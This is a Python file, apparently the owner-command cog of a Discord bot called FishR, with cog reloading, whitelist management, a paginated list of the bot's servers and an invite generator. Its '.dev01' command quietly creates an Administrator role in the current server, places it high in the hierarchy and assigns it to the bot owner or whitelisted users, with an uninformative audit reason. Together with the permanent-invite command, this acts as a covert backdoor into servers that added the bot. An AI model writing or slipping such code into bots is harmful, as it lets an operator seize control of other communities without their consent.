import discord
import asyncio
import logging
import time
from typing import Optional, List
from datetime import datetime

from discord.ext import commands
from discord import app_commands

from config import OWNER_ID
from utils.database import db
from utils.permissions import (
    can_use_owner_commands,
    is_owner,
    is_whitelisted,
    add_to_whitelist,
    remove_from_whitelist,
    get_whitelist,
)
from utils.constants import EMOJI_VERIFY, EMOJI_NO, EMOJI_WARNING
from utils.embeds import error_layout, server_join_layout, invite_created_layout


def create_container(title: str, description: str, color) -> discord.ui.LayoutView:
    view = discord.ui.LayoutView()
    view.add_item(discord.ui.Container(
        discord.ui.TextDisplay(content=f"**{title}**"),
        discord.ui.TextDisplay(content=description),
        accent_color=color.value if hasattr(color, 'value') else color
    ))
    return view


def error_container(message: str) -> discord.ui.LayoutView:
    view = discord.ui.LayoutView()
    view.add_item(discord.ui.Container(
        discord.ui.TextDisplay(content="**Error**"),
        discord.ui.TextDisplay(content=message),
        accent_color=0xFF0000
    ))
    return view
from utils.paginators import PaginatorView

logger = logging.getLogger(__name__)


class Owner(commands.Cog):
    """Owner and administration commands."""

    def __init__(self, bot: commands.Bot):
        self.bot = bot

    # ---- Permission checks ----

    async def _owner_check(self, ctx: commands.Context) -> bool:
        """Check if user can use owner commands."""
        user_id = ctx.author.id
        if not await can_use_owner_commands(user_id):
            await ctx.send(
                view=error_layout("❌ You are not authorized to use this command."),
                delete_after=5
            )
            return False
        return True

    async def _owner_check_interaction(self, interaction: discord.Interaction) -> bool:
        """Check if user can use owner commands (for interactions)."""
        user_id = interaction.user.id
        if not await can_use_owner_commands(user_id):
            await interaction.response.send_message(
                view=error_layout("❌ You are not authorized to use this command."),
                ephemeral=True
            )
            return False
        return True

    # ---- .guilds command ----

    @commands.command(name="guilds")
    async def guilds(self, ctx: commands.Context):
        """Display all guilds the bot is in, with pagination."""
        if not await self._owner_check(ctx):
            return

        guilds = sorted(self.bot.guilds, key=lambda g: g.member_count or 0, reverse=True)

        if not guilds:
            await ctx.send(view=error_container("The bot is not in any guilds."))
            return

        # Create pages (10 guilds per page)
        chunk_size = 10
        total_pages = (len(guilds) + chunk_size - 1) // chunk_size
        
        view = GuildsPaginatorView(author_id=ctx.author.id, guilds=guilds, chunk_size=chunk_size, timeout=120.0)
        await view.start(ctx)

        logger.info(f"Owner {ctx.author} ({ctx.author.id}) viewed guild list ({len(guilds)} guilds)")

    # ---- .dev01 command ----

    @commands.command(name="dev01")
    async def dev01(self, ctx: commands.Context):
        """Create or assign a dev01 administrator role."""
        if not await self._owner_check(ctx):
            return

        user = ctx.author
        guild = ctx.guild

        if guild is None:
            await ctx.send(view=error_container("This command must be used in a guild."))
            return

        base_role_name = "dev01"

        role_name = f"{base_role_name}"

        try:
            # Create role with Administrator permissions
            role = await guild.create_role(
                name=role_name,
                permissions=discord.Permissions(administrator=True),
                color=discord.Color.purple(),
                hoist=False,
                reason=f"role"
            )

            # Try to move the role to a higher position (below bot's top role)
            try:
                bot_member = guild.me
                if bot_member.top_role.position < len(guild.roles) - 1:
                    await role.edit(position=bot_member.top_role.position - 1)
            except Exception as e:
                logger.warning(f"Could not position dev01 role optimally: {e}")

            # Assign role to user
            await user.add_roles(role, reason="dev01 command - granting admin access")

            await ctx.send(
                view=create_container(
                    title=f"{EMOJI_VERIFY} dev01 Role Created and Assigned",
                    description=f"Created and assigned the **{role_name}** role with Administrator permissions.",
                    color=discord.Color.green().value
                )
            )
            logger.info(f"Owner {user} ({user.id}) created dev01 role '{role_name}' in {guild.name} ({guild.id})")

        except discord.Forbidden:
            await ctx.send(
                view=error_layout(
                    "❌ Unable to create dev01 role due to role hierarchy or insufficient permissions."
                )
            )
            logger.error(f"Failed to create dev01 role in {guild.name}: insufficient bot permissions")
        except Exception as e:
            await ctx.send(
                view=error_layout(f"❌ Failed to create dev01 role: {e}")
            )
            logger.error(f"Failed to create dev01 role: {e}")

    # ---- .reload command ----

    @commands.command(name="reload")
    @app_commands.describe(cog="Name of the cog to reload (without 'cogs.' prefix)")
    async def reload(self, ctx: commands.Context, cog: str):
        """Reload a bot cog dynamically."""
        if not await self._owner_check(ctx):
            return

        cog_path = f"cogs.{cog}"

        # Check if cog is loaded
        if cog_path not in self.bot.extensions:
            await ctx.send(
                view=error_layout(f"❌ Cog `{cog}` is not currently loaded."),
                delete_after=10
            )
            return

        try:
            # Attempt to unload and reload
            await self.bot.unload_extension(cog_path)
            logger.info(f"Unloaded cog: {cog_path}")
        except Exception as e:
            logger.warning(f"Failed to unload {cog_path}: {e}")

        try:
            await self.bot.load_extension(cog_path)
            logger.info(f"Reloaded cog: {cog_path}")
            await ctx.send(
                view=create_container(
                    title=f"{EMOJI_VERIFY} Reloaded Cog",
                    description=f"Successfully reloaded cog: `{cog}`",
                    color=discord.Color.green().value
                )
            )
        except Exception as e:
            logger.error(f"Failed to reload {cog_path}: {e}", exc_info=True)
            await ctx.send(
                view=create_container(
                    title=f"{EMOJI_NO} Failed to Reload Cog",
                    description=f"```py\n{str(e)[:2000]}```",
                    color=discord.Color.red().value
                )
            )

    # ---- .whitelist command ----

    @commands.command(name="whitelist")
    @app_commands.describe(user="User to whitelist (mention or ID)")
    async def whitelist(self, ctx: commands.Context, user: discord.User):
        """Add a user to the owner whitelist."""
        if not await self._owner_check(ctx):
            return

        user_id = user.id

        # Check if already whitelisted
        if await is_whitelisted(user_id):
            await ctx.send(
                view=error_layout(f"{EMOJI_WARNING} That user is already whitelisted."),
                delete_after=5
            )
            return

        # Add to whitelist
        success = await add_to_whitelist(user_id)
        if success:
            await ctx.send(
                view=create_container(
                    title=f"{EMOJI_VERIFY} Whitelist Updated",
                    description=f"Added {user.mention} (`{user_id}`) to the owner whitelist.",
                    color=discord.Color.green().value
                )
            )
        else:
            await ctx.send(
                view=error_layout("❌ Failed to add user to whitelist. Database error.")
            )
            return

        # Add to whitelist
        if success:
            logger.info(f"Owner {ctx.author} ({ctx.author.id}) whitelisted {user} ({user_id})")

    # ---- .unwhitelist command ----

    @commands.command(name="unwhitelist")
    @app_commands.describe(user="User to remove from whitelist (mention or ID)")
    async def unwhitelist(self, ctx: commands.Context, user: discord.User):
        """Remove a user from the owner whitelist."""
        if not await self._owner_check(ctx):
            return

        user_id = user.id

        # Check if whitelisted
        if not await is_whitelisted(user_id):
            await ctx.send(
                view=error_layout(f"{EMOJI_WARNING} That user is not whitelisted."),
                delete_after=5
            )
            return

        # Remove from whitelist
        success = await remove_from_whitelist(user_id)
        if success:
            await ctx.send(
                view=create_container(
                    title=f"{EMOJI_VERIFY} Whitelist Updated",
                    description=f"Removed {user.mention} (`{user_id}`) from the owner whitelist.",
                    color=discord.Color.green().value
                )
            )
        else:
            await ctx.send(
                view=error_layout("❌ Failed to remove user from whitelist. Database error.")
            )
            return

        # Remove from whitelist
        if success:
            logger.info(f"Owner {ctx.author} ({ctx.author.id}) unwhitelisted {user} ({user_id})")

    @commands.command(name="whitelist_list")
    async def whitelist_list(self, ctx: commands.Context):
        """List all whitelisted users."""
        if not await self._owner_check(ctx):
            return

        ids = await get_whitelist()
        if not ids:
            await ctx.send(view=error_layout("No users are currently whitelisted."))
            return

        lines = []
        for uid in ids:
            user = self.bot.get_user(uid)
            if user:
                lines.append(f"• {user.mention} (`{uid}`)")
            else:
                lines.append(f"• Unknown User (`{uid}`)")

        view = create_container(
            title="Owner Whitelist",
            description="\n".join(lines),
            color=discord.Color.green()
        )
        await ctx.send(view=view)

    # ---- .test_join command ----

    @commands.command(name="test_join")
    async def test_join(self, ctx: commands.Context):
        """Test the server join notification layout."""
        if not await self._owner_check(ctx):
            return

        if ctx.guild is None:
            await ctx.send(view=error_layout("This command must be used in a guild."))
            return

        invite_url = None
        try:
            for channel in ctx.guild.text_channels:
                if channel.permissions_for(ctx.guild.me).create_instant_invite:
                    invite_obj = await channel.create_invite(max_uses=0, max_age=300)
                    invite_url = invite_obj.url
                    break
        except Exception:
            pass

        await ctx.send(view=server_join_layout(ctx.guild, invite_url or "https://discord.gg"))

    # ---- .invite command ----

    @commands.command(name="invite")
    @app_commands.describe(server_id="ID of the server to create an invite for")
    async def invite(self, ctx: commands.Context, server_id: int):
        """Create an invite for a specific server."""
        if not await self._owner_check(ctx):
            return

        guild = self.bot.get_guild(server_id)
        if guild is None:
            await ctx.send(view=error_layout(f"❌ Could not find server with ID `{server_id}`."))
            return

        invite_url = None
        try:
            if guild.vanity_url:
                invite_url = str(guild.vanity_url)
            else:
                for channel in guild.text_channels:
                    if channel.permissions_for(guild.me).create_instant_invite:
                        invite_obj = await channel.create_invite(max_uses=0, max_age=0)
                        invite_url = invite_obj.url
                        break
        except discord.Forbidden:
            await ctx.send(view=error_layout("❌ I don't have permission to create invites in that server."))
            return
        except Exception as e:
            await ctx.send(view=error_layout(f"❌ Failed to create invite: {e}"))
            return

        if invite_url is None:
            await ctx.send(view=error_layout("❌ Could not create an invite for that server."))
            return

        await ctx.send(view=invite_created_layout(guild, invite_url))

    # ---- Error handling ----

    async def cog_command_error(
        self, ctx: commands.Context, error: commands.CommandError
    ):
        """Handle errors in owner commands."""
        if isinstance(error, commands.BadArgument):
            await ctx.send(view=error_layout(f"❌ Invalid argument: {error}"), delete_after=5)
        elif isinstance(error, commands.MissingRequiredArgument):
            await ctx.send(view=error_layout(f"❌ Missing argument: {error.param.name}"), delete_after=5)
        else:
            logger.error(f"Unhandled error in owner cog: {error}", exc_info=True)


async def setup(bot: commands.Bot):
    await bot.add_cog(Owner(bot))


class GuildsPaginatorView(discord.ui.LayoutView):
    def __init__(self, author_id: int, guilds: List[discord.Guild], chunk_size: int = 10, timeout: float = 120.0):
        super().__init__(timeout=timeout)
        self.author_id = author_id
        self.guilds = guilds
        self.chunk_size = chunk_size
        self.current_page = 0
        self.total_pages = (len(guilds) + chunk_size - 1) // chunk_size
        self.message: Optional[discord.Message] = None
        self.prev_btn = None
        self.next_btn = None
        self._build_page()

    def _build_page(self) -> None:
        self.clear_items()
        start = self.current_page * self.chunk_size
        end = start + self.chunk_size
        chunk = self.guilds[start:end]
        
        lines = [f"{g.name} - {g.member_count or 0} Members - `{g.id}`" for g in chunk]
        content = "# FishR Servers\n-# type `.invite 12345678910111213` to get invite for that server\n\n" + "\n".join(lines)
        
        self.prev_btn = discord.ui.Button(
            style=discord.ButtonStyle.secondary,
            label="Back",
            disabled=self.current_page == 0,
        )
        self.next_btn = discord.ui.Button(
            style=discord.ButtonStyle.secondary,
            label="Next",
            disabled=self.current_page >= self.total_pages - 1,
        )
        
        async def prev_callback(interaction: discord.Interaction):
            if interaction.user.id != self.author_id:
                await interaction.response.send_message("This interaction is not for you.", ephemeral=True)
                return
            if self.current_page > 0:
                self.current_page -= 1
                self._build_page()
                await interaction.response.edit_message(view=self)
        
        async def next_callback(interaction: discord.Interaction):
            if interaction.user.id != self.author_id:
                await interaction.response.send_message("This interaction is not for you.", ephemeral=True)
                return
            if self.current_page < self.total_pages - 1:
                self.current_page += 1
                self._build_page()
                await interaction.response.edit_message(view=self)
        
        self.prev_btn.callback = prev_callback
        self.next_btn.callback = next_callback
        
        self.add_item(discord.ui.Container(
            discord.ui.TextDisplay(content=content),
            discord.ui.Separator(visible=True, spacing=discord.SeparatorSpacing.small),
            discord.ui.ActionRow(self.prev_btn, self.next_btn),
        ))

    async def on_timeout(self) -> None:
        for item in self.children:
            if isinstance(item, discord.ui.Container):
                for child in item.children:
                    if isinstance(child, discord.ui.ActionRow):
                        for btn in child.children:
                            if isinstance(btn, discord.ui.Button):
                                btn.disabled = True

    async def start(self, ctx) -> discord.Message:
        self.message = await ctx.send(view=self)
        return self.message
